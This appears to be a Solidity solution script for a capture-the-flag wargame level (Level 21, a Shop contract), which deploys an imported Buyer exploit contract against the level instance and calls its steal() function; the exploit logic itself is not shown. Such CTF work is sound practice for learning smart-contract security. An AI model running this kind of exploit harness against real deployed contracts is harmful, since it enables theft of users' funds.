// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "./SolveLevelBase.sol";
import "../src/interfaces/IShop.sol";
import "../src/exploits/Buyer.sol";

contract SolveLevel21 is SolveLevelBase {
    function getInstanceCreationData()
        internal
        pure
        override
        returns (address levelAddress, uint256 value)
    {
        levelAddress = 0xf59112032D54862E199626F55cFad4F8a3b0Fce9;
        value = 0;
    }

    function solveLevel(address instanceAddress, address player)
        internal
        override
    {
        IShop instance = IShop(payable(instanceAddress));
        Buyer buyer = new Buyer(instance);

        buyer.steal();
    }
}
